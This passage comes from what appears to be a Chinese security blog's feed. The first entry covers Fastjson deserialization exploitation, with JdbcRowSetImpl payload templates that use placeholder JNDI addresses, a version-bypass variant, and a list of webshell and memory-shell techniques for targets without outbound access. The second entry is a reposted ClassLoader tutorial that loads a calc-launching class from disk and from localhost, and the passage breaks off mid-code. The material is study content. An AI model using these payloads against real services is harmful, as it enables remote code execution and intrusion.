class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-25–1-2-47"><a href="#1-2-25–1-2-47" class="headerlink" title="1.2.25–1.2.47"></a>1.2.25–1.2.47</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-48–1-2-68"><a href="#1-2-48–1-2-68" class="headerlink" title="1.2.48–1.2.68"></a>1.2.48–1.2.68</h4><h4 id="1-2-80"><a href="#1-2-80" class="headerlink" title="1.2.80"></a>1.2.80</h4><h1 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h1><ul><li><p>TemplatesImpl链注入内存马，TemplatesImpl链限制多，不容易遇到</p></li><li><p>Commons-io 写文件&#x2F;webshell  低版本</p><p>限制：fastjson&lt;1.2.68</p></li><li><p>BECL攻击，命令执行&#x2F;内存马</p><p>限制：Java 8u251以后，bcel类被删除</p></li><li><p>C3P0<strong>反序列化</strong></p></li><li><p>命令执行结果写到静态目录下</p></li></ul><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA">第18篇：fastjson反序列化漏洞区分版本号的方法总结 (qq.com)</a></p><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合</a></p><p><a href="https://xz.aliyun.com/t/12492">Fastjson不出网利用总结 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载器</title>
      <link href="/2023/05/01/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
      <url>/2023/05/01/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自<a href="https://xz.aliyun.com/t/9002#toc-0">JAVA安全基础（一）–类加载器（ClassLoader） - 先知社区 (aliyun.com)</a></p></blockquote><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。</p><h2 id="0x02-Java类运行"><a href="#0x02-Java类运行" class="headerlink" title="0x02 Java类运行"></a>0x02 Java类运行</h2><p><img src="/../images/EsePjI7n9CtyqbA.png" alt="image-20230502220543579"></p><p>一切的Java类都必须先转换为类字节码然后经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件（类字节码）的加载</p><h2 id="0x03-应用场景"><a href="#0x03-应用场景" class="headerlink" title="0x03 应用场景"></a>0x03 应用场景</h2><h3 id="1、资源隔离"><a href="#1、资源隔离" class="headerlink" title="1、资源隔离"></a>1、资源隔离</h3><p>实现不同项目或者同一个项目上的不同版本的jar包隔离，避免集群错误或者冲突的产生。</p><h3 id="2、热部署"><a href="#2、热部署" class="headerlink" title="2、热部署"></a>2、热部署</h3><p>对于Java应用程序来说，热部署就是在运行时更新Java类文件。在基于Java的应用服务器实现热部署的过程中，类装入器扮演着重要的角色。类装入器不能重新装入一个已经装入的类，但只要使用一个新的类装入器实例，就可以将类再次装入一个正在运行的应用程序。这样我们应用正在运行的时候升级软件，却不需要重新启动应用。</p><h3 id="3、代码保护"><a href="#3、代码保护" class="headerlink" title="3、代码保护"></a>3、代码保护</h3><p>我们可以对字节码文件进行加密，然后再使用特定的ClassLoader解密文件内容，再加载这些字节码文件。这样就能够实现对我们的代码项目加密保护，别人无法进行反编译查看源代码信息。</p><h2 id="0x04-双亲委派"><a href="#0x04-双亲委派" class="headerlink" title="0x04 双亲委派"></a>0x04 双亲委派</h2><ul><li><p>Bootstrap ClassLoader（引导类加载器）</p><blockquote><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中</p></blockquote></li><li><p>Extension ClassLoader（扩展类加载器）</p><blockquote><p>扩展类加载器(ExtensionsClassLoader)用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p></blockquote></li><li><p>App ClassLoader（系统类加载器）</p><blockquote><p>系统类加载器（App ClassLoader）一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。</p><p><code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载</p></blockquote></li></ul><p>获得类对象的类加载器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xxx.class.getClassLoader()</span><br></pre></td></tr></table></figure><p><img src="/../images/20210108151613-642298d0-5181-1.png" alt="20210108151613-642298d0-5181-1"></p><p>如上图类加载器层次关系，我们可以将其称为类加载器的双亲委派模型。但注意的是，他们之间并不是”继承”体系，而是委派体系。当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。这样可以避免有些类被重复加载。</p><blockquote><h3 id="双亲委派好处"><a href="#双亲委派好处" class="headerlink" title="双亲委派好处"></a>双亲委派好处</h3><p>1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</p><p>2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类</p></blockquote><h2 id="CLassLoader类核心方法"><a href="#CLassLoader类核心方法" class="headerlink" title="CLassLoader类核心方法"></a>CLassLoader类核心方法</h2><p>除了上述BootstrapClassLoader，其他类加载器都是继承了CLassLoader类，我们就一起看看其类的核心方法。以下代码都是截取了其方法的源码。</p><h3 id="1、loadClass"><a href="#1、loadClass" class="headerlink" title="1、loadClass"></a>1、loadClass</h3><p><strong>加载指定的java类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在loadClass方法中，它先使用了findLoadedClass(String)方法来检查这个类是否被加载过。</p><p>接着使用父加载器调用loadClass（String）方法，如果父加载器为null，类加载器加载jvm内置的加载器。</p><p>之后就调用findClass(String) 方法装载类。</p><p>最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。</p><h3 id="2、findCLass"><a href="#2、findCLass" class="headerlink" title="2、findCLass"></a>2、findCLass</h3><p><strong>查找指定的Java类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3、findLoadedClass"><a href="#3、findLoadedClass" class="headerlink" title="3、findLoadedClass"></a>3、findLoadedClass</h3><p><strong>查找JVM已经加载过的类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4、defineClass"><a href="#4、defineClass" class="headerlink" title="4、defineClass"></a>4、defineClass</h3><p><strong>定义一个Java类，将字节码解析成虚拟机识别的Class对象（就是在JVM中注册该类）。往往和findClass()方法配合使用。</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="5、resolveClass"><a href="#5、resolveClass" class="headerlink" title="5、resolveClass"></a>5、resolveClass</h3><p><strong>链接指定Java类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> &#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">resolveClass0</span><span class="params">(Class c)</span>;</span><br></pre></td></tr></table></figure><h2 id="自定义类加载器过程"><a href="#自定义类加载器过程" class="headerlink" title="自定义类加载器过程"></a>自定义类加载器过程</h2><p>因为在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式。</p><p>在上面loadClass方法分析中，他内部其实是调用findClass(String) 方法来装载类，所以我们要想加载自己自定义的类，就是覆盖这个findClass(String) 方法，而不是loadClass方法。</p><p>以下就是自定义类加载器步骤：</p><p>1、继承ClassLoader类</p><p>2、覆盖findClass()方法</p><p>3、在findClass()方法中调用defineClass()方法</p><p>这里我们借助一个加密java类字节码例子来讲解。</p><p>这里我们先创建一个CypherTest.java文件，然后使用java -d . CypherTest.java，然后就能生成CypherTest.class文件了。</p><p>CypherTest.java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CypherTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This experiment test is successful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目录下生成了CypherTest.class文件。</p><p><img src="E:/blog/source/images/20210108153058-73a8d0f6-5183-1.png" alt="20210108153058-73a8d0f6-5183-1"></p><p>之后我们编写一个加密类Encryption，使用简单的逐位取反进行加密操作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encryption</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        encode(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/usr/local/com/test/CypherTest.class&quot;</span>), <span class="comment">// 获取路径CypherTest.class文件</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/usr/local/temp/com/test/CypherTest.class&quot;</span>)); <span class="comment">// 为了保持一致，创建了一个空的temp目录</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(File src, File dest)</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(src);</span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dest);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 逐位取反操作</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = fis.read()) != -<span class="number">1</span>) &#123;<span class="comment">// 读取一个字节</span></span><br><span class="line">                fos.write(temp ^ <span class="number">0xff</span>);<span class="comment">// 取反输出</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; <span class="comment">// 关闭数据流</span></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;This experiment test is successful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们看到生成了加密后新的CypherTest.class文件。</p><p><img src="E:/blog/source/images/20210108153148-9133b8e8-5183-1.png" alt="20210108153148-9133b8e8-5183-1"></p><p>因为这个是自定义加密后，我们无法使用工具直接进行反编译操作和直接使用jvm默认类加载器去使用它。</p><p>之后我们再编写一个Dectyption解密类，对新加密的CypherTest.class进行解密操作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Decryption</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123; <span class="comment">// 继承ClassLoader类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Decryption</span><span class="params">(String rootDir)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rootDir = rootDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 重写覆盖findClass</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(className);</span><br><span class="line">        <span class="keyword">if</span> (c != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.getParent();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = parent.loadClass(className);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// System.out.println(&quot;父类无法加载你的class，抛出ClassNotFoundException,已捕获，继续运行&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;父类成功加载&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// 读取文件 转化成字节数组</span></span><br><span class="line">                <span class="type">byte</span>[] classData = getClassData(className);</span><br><span class="line">                <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// 调用defineClass()方法</span></span><br><span class="line">                    c = defineClass(className, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> rootDir + <span class="string">&quot;/&quot;</span> + className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="comment">// 将流中的数据转换为字节数组</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(temp ^ <span class="number">0xff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    is.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们使用将Decryption继承ClassLoader类，之后覆盖findClass()方法，并且在findClass()方法中调用defineClass()方法使用，最后加载我们自定义的getClassData方法去进行解密操作。</p><p>最后我们使用一个Demo进行测试，去查看当前类加载器机制的情况。如果我们想要获取其输出的System.out.println语句，需要反射机制去实现。这篇文章我们只学习ClassLoader类应用，就不去涉及其他知识点，获取其类加载器查看即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Decryption</span> <span class="variable">deLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Decryption</span>(<span class="string">&quot;/usr/local/temp/&quot;</span>);<span class="comment">// 解密加载器</span></span><br><span class="line">        Class&lt;?&gt; t1 = deLoader.loadClass(<span class="string">&quot;com.test.CypherTest&quot;</span>);<span class="comment">// 加载已加密的类</span></span><br><span class="line">        System.out.println(<span class="string">&quot;c3 的Class是  &quot;</span> + t1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/20210108153311-c27f545c-5183-1.png" alt="20210108153311-c27f545c-5183-1"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>除了上述自定义ClassLoader类，我们还可以学习URLClassLoader。URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。</p><h3 id="1-本地磁盘class文件调用"><a href="#1-本地磁盘class文件调用" class="headerlink" title="1. 本地磁盘class文件调用"></a>1. 本地磁盘class文件调用</h3><p>首先我在D盘创建了一个Test.java文件，写了一段calc.exe计算机弹窗代码。如果文件被成功解析执行，会输出Test success字段且弹出计算器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用javac进行编译，在D盘生成对应的class文件。</p><p>之后我们再修改ClassLoaderTest类，利用URLClassLoader方式去获取D盘中Test.class文件。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.test.Test&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用File获取类文件路径，之后使用URLClassLoader获取url地址为D盘，之后使用loadClass方法获取Test.class所含包名，然后实例化。运行发现解析获取到了D盘中Test.class文件。</p><p><img src="/../images/20210108153608-2c5edf50-5184-1.png" alt="20210108153608-2c5edf50-5184-1"></p><h3 id="2-网络传输class文件调用"><a href="#2-网络传输class文件调用" class="headerlink" title="2. 网络传输class文件调用"></a>2. 网络传输class文件调用</h3><p>之后我们将Test.class放置到电脑的Tomcat服务器目录下，然后启动Tomcat。之后新建个ClassLoaderDemo类网络加载Tomcat服务器中的Test.class.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/examples/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> 